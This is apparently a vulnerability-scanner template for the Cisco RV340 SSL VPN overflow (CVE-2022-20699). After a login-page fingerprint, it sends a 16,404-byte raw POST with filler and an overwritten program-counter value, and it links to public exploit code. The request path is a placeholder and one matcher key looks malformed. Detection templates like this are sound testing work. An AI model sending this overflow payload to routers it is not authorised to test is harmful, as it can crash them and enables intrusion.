id: cve-2022-20699
info:
  name: Cisco RV340 SSLVPN Unauthenticaed RCE
  author: dr4g0n369
  severity: critical
  description: |
    Multiple vulnerabilities in Cisco Small Business RV160, RV260, RV340, and RV345 Series Routers could allow an attacker to do any of the following: Execute arbitrary code Elevate privileges Execute arbitrary commands Bypass authentication and authorization protections Fetch and run unsigned software Cause denial of service (DoS)
  reference:
    - https://nvd.nist.gov/vuln/detail/cve-2022-20699
    - https://github.com/puckiestyle/CVE-2022-20699/blob/main/CVE-2022-20699.py
    - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/misc/cisco_rv340_sslvpn.rb
    - https://packetstormsecurity.com/files/167113/Cisco-RV340-SSL-VPN-Unauthenticated-Remote-Code-Execution.html
  tags: cisco, buffer-overflow, rce

variables:
  shellcode: ""
  filler: "{{repeat('\x05', 16400 - len(shellcode))}}"
  pc: "\x98\xed\x4a\x70"

http:
  - method: GET
    path:
      - "{{BaseURL}}/login.html"

    matchers-condition: and
    matcher:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "The Cisco AnyConnect VPN Client is required to connect to the SSLVPN server"
  - raw:
      - |
        POST /XXXXXXX HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 16404

        {{shellcode}}{{filler}}{{pc}}
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "HTTP/1.1 500"
        part: response-headers
      - type: status
        status:
          - 500 
      - type: word
        words:
          - "Internal Server Error"
        part: body

